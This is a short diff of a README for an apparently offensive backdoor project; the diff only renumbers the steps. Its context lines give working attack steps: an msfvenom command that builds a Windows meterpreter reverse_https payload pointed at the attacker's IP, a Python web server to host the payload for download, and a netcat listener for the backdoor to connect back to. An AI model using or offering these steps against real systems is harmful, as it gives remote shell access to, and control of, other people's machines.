@@ -35,7 +35,7 @@ Use this for ethical hacking only
     exit
    
     
-4- Create the Payload with msfvenom in Kali linux
+5- Create the Payload with msfvenom in Kali linux
 
    In my case:
    - Host IP= 192.168.235.132  
@@ -45,10 +45,10 @@ Use this for ethical hacking only
     msfvenom -p windows/x64/meterpreter/reverse_https lhost=(Host IP) lport=(Host Port) HandlerSSLCert=(Path To cert file) StagerVerifySSLCert=true -f raw > load.bin
     
    
-5- Setup the http webserver for Payload download (while in cybersecurity folder)
+6- Setup the http webserver for Payload download (while in cybersecurity folder)
 
     python -m http.server
     
-5- Open the listner for the backdoor to connect to (using netcat)
+7- Open the listner for the backdoor to connect to (using netcat)
 
     nc -lvvnp
